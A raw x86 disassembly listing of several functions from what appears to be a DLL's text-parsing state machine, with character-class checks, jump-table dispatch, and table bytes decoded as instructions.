mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_1004c3a0
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x15
call sub_10079830
mov ecx [ ebp + 0x14 ]
push ecx
call sub_10079960
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10031030
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_1004c3a0
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_1004c3a0
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ edi + 0x94 ]
push eax
call sub_1003fa70
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_1007b4d0 ]
jmp [ edx * 4 + jump_table_1007b4c0 ]
call sub_10079a70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10079a70
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_1007b4d4
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_1007b510
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_1007b5f4 ]
jmp [ ecx * 4 + jump_table_1007b5ec ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_1003e930
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0x7
add eax 0x15
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x15
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_1004c3a0
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_1007b5f6
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_1007b630
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
movzx eax [ eax + lookup_table_1007b704 ]
jmp [ eax * 4 + jump_table_1007b6f0 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1d
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ edx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b709
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b750
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1c
movzx eax [ eax + lookup_table_1007b82c ]
jmp [ eax * 4 + jump_table_1007b818 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x1e
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x1f
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push 0x2
mov eax esi
mov [ edx ] 0x1c
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ eax ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007b831
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x2
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add ecx esp
int3
sub_1007b870
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3f
ja r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1c
movzx eax [ eax + lookup_table_1007b960 ]
jmp [ eax * 4 + jump_table_1007b948 ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov [ edx ] 0x1f
jmp r-xdata
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x5
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x1c
push 0x2
mov eax esi
call sub_10079230
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_100795c0
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0xe
mov eax esi
call sub_10079230
mov ecx [ esi + 0x8 ]
add esp 0x4
pop edi
mov [ ecx ] 0x0
mov eax 0x2
pop esi
pop ebp
retn
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
sub_1007b966
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add al [ 0x5050505 ]
add eax 0x5050505
add eax 0x3050505
add eax 0xec8b5504
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x1c
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add esi 0x20
push esi
push edi
mov [ eax ] 0x20
call sub_1004af10
push esi
push edi
call sub_10006330
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x18
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_1007ba10
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
lea ecx [ eax - 0x9 ]
push esi
push edi
cmp ecx 0x35
ja r-xdata
cmp eax 0x41
jl r-xdata
movzx ecx [ ecx + lookup_table_1007baf4 ]
jmp [ ecx * 4 + jump_table_1007baec ]
lea ecx [ eax - 0x61 ]
cmp ecx 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov edx [ ebp + 0xc ]
add edx 0x20
push edx
push r--data
call sub_1003e930
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
neg eax
sbb eax eax
and eax 0xfffffff9
add eax 0x1c
mov [ ecx ] eax
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x10
pop edi
mov eax 0x1
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
pop edi
mov [ ecx ] 0x1c
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
lea edx [ eax - 0x41 ]
cmp edx 0x19
ja r-xdata
mov ecx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
add ecx 0x20
push ecx
push eax
push edi
call sub_1004c3a0
mov edx [ edi + 0x8 ]
add edx 0x94
push edx
call sub_100194e0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_100795c0
add esp 0x14
pop edi
mov eax 0x1
pop esi
pop ebp
retn
add eax 0x20
sub_1007baf6
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] al
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ ecx ] eax
add [ eax ] eax
int3
sub_1007bb30
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007bc6c ]
jmp [ eax * 4 + jump_table_1007bc50 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ ecx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov [ edx ] 0x22
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push 0xfffd
push esi
call sub_1004c3a0
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079830
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_10079230
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov edx [ ebp + 0x10 ]
push edi
push edx
push ebx
call sub_1004c3a0
add esp 0xc
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_1006c7a0
push ebx
call sub_1003fa70
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebx + 0x8 ]
lea eax [ esi - 0x41 ]
mov [ edx ] 0x22
cmp eax 0x19
ja r-xdata
sub_1007bc73
push es
push es
push es
add al [ edx ]
push es
add al [ esi ]
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add al [ esi ]
add eax [ esi ]
push es
push es
push es
add eax [ esi ]
push es
push es
push es
push es
push es
push es
add al 0x6
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
push es
add eax [ ebx ]
add eax 0xcccccccc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
lea ecx [ esi - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx eax [ eax + r-xdata ]
jmp [ eax * 4 + r-xdata ]
mov edx [ ebp + 0x8 ]
mov [ ebp + 0x10 ] esi
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b70
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x23
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b70
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b70
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_10079b70
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_10079230
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov eax [ ebp + 0x8 ]
push 0x10
call sub_10079230
add esp 0x4
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_1006c7a0
push ebx
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_1006c7a0
lea eax [ esi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
sub_1007bdac
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x0
call sub_10079830
push 0xf
mov eax ebx
call sub_10079230
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_1007be5c
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_1007bea0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
lea eax [ esi + 0x1 ]
push edi
cmp eax 0x3f
ja r-xdata
mov ebx [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_1007bff8 ]
jmp [ eax * 4 + jump_table_1007bfd8 ]
mov [ ebp + 0x10 ] esi
mov esi [ ebx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
add esi 0x20
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x24
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov edi [ ebp + 0x14 ]
push eax
mov [ edx ] 0x0
call sub_100796f0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x22
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0xfffd
push esi
call sub_1004c3a0
add esp 0x10
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0xf
mov eax ebx
call sub_10079230
mov edx [ ebx + 0x8 ]
add esp 0x4
mov [ edx ] 0x0
call sub_10079830
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ ebp + 0x8 ]
push 0x10
mov eax ebx
call sub_10079230
add esp 0x4
jmp r-xdata
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push ebx
call sub_1004c3a0
add esp 0xc
lea edx [ esi + 0x50 ]
push edx
lea ebx [ esi + 0x94 ]
push ebx
call sub_1006c7a0
push ebx
call sub_1003fa70
mov ebx [ ebp + 0x8 ]
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebx + 0x8 ]
lea ecx [ esi - 0x41 ]
mov [ eax ] 0x22
cmp ecx 0x19
ja r-xdata
sub_1007c000
pop es
pop es
add al [ edx ]
pop es
add al [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add al [ edi ]
add eax [ edi ]
pop es
pop es
pop es
add eax [ edi ]
pop es
pop es
pop es
pop es
pop es
pop es
add al 0x7
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
pop es
add eax [ 0xffffffffcccccc06 ]
int3
sub_1007c040
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
inc eax
push edi
mov edi [ ebp + 0x8 ]
cmp eax 0x61
ja r-xdata
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x27
mov ebx [ edi + 0x8 ]
add ebx 0x3c
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
movzx eax [ eax + lookup_table_1007c1fc ]
jmp [ eax * 4 + jump_table_1007c1d8 ]
mov eax [ ebp + 0x10 ]
push ebx
push eax
push edi
call sub_1004c3a0
add esp 0xc
mov esi [ edi + 0x8 ]
lea edx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push edx
push eax
call sub_1006c7a0
lea eax [ esi + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax edi
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x25
call sub_100793f0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0xc ]
mov edx edi
mov eax [ edx + 0x8 ]
pop edi
mov [ eax ] 0x27
pop esi
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov eax edi
mov edx [ eax + 0x8 ]
mov [ edx ] 0x26
call sub_100793f0
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x2
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov [ eax ] 0x27
mov edi [ esi + 0x8 ]
mov ecx [ r--data ]
add edi 0x3c
add esp 0x4
cmp [ edi + 0x4 ] 0x0
mov [ ebp + 0x10 ] ecx
jne r-xdata
mov ebx edi
push 0x13
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079830
mov edx [ ebp + 0xc ]
pop edi
pop esi
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop ebx
pop ebp
retn
mov esi edi
push 0x14
mov eax esi
call sub_10079230
mov eax [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ eax ] 0x0
call sub_100796f0
add esp 0x8
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn
push 0x15
mov eax edi
call sub_10079230
add esp 0x4
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0x10 ]
push edi
push eax
push esi
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov ebx [ esi + 0x8 ]
lea edx [ ebx + 0x50 ]
lea eax [ ebx + 0x94 ]
push edx
push eax
call sub_1006c7a0
lea eax [ ebx + 0x94 ]
push eax
call sub_1003fa70
add esp 0xc
mov [ ebx + 0x48 ] eax
sub_1007c205
or [ edx ] al
add cl [ eax ]
add cl [ eax ]
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
add cl [ eax ]
add ecx [ eax ]
or [ eax ] cl
add al 0x5
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
push es
push es
pop es
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ eax ] cl
or [ esi ] al
int3
sub_1007c260
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x27
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_1007c340 ]
jmp [ eax * 4 + jump_table_1007c32c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x11
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079830
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_1007c345
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x3
int3
sub_1007c370
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
lea eax [ ecx + 0x1 ]
cmp eax 0x28
ja r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
add edx 0x3c
push edx
push ecx
push eax
call sub_1004c3a0
add esp 0xc
mov eax 0x2
pop ebp
retn
movzx eax [ eax + lookup_table_1007c450 ]
jmp [ eax * 4 + jump_table_1007c43c ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov [ edx ] 0x29
mov eax 0x2
pop ebp
retn
mov eax [ ebp + 0xc ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov [ ecx ] 0x28
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_10079230
mov edx [ esi + 0x8 ]
mov eax [ r--data ]
add edx 0x3c
push edx
push eax
push esi
call sub_1004c3a0
add esp 0x10
pop esi
mov eax 0x2
pop ebp
retn
push ebx
mov ebx [ ebp + 0x8 ]
push 0x12
mov eax ebx
call sub_10079230
mov ecx [ ebx + 0x8 ]
add esp 0x4
mov [ ecx ] 0x0
call sub_10079830
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] 0x1
pop ebx
mov eax 0x2
pop ebp
retn
sub_1007c455
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ ebx ]
int3
sub_1007c480
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
inc eax
push esi
push edi
cmp eax 0x61
ja r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
jne r-xdata
movzx eax [ eax + lookup_table_1007c604 ]
jmp [ eax * 4 + jump_table_1007c5e8 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push edi
push edx
push eax
call sub_1004c3a0
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
push ecx
lea ebx [ esi + 0x94 ]
push ebx
call sub_1006c7a0
push ebx
call sub_1003fa70
add esp 0xc
mov [ esi + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x21
call sub_10079d70
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
mov eax [ ebp + 0xc ]
mov edx [ eax ]
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x6c ] edx
mov edx [ ecx + 0x8 ]
pop edi
mov [ edx ] 0x28
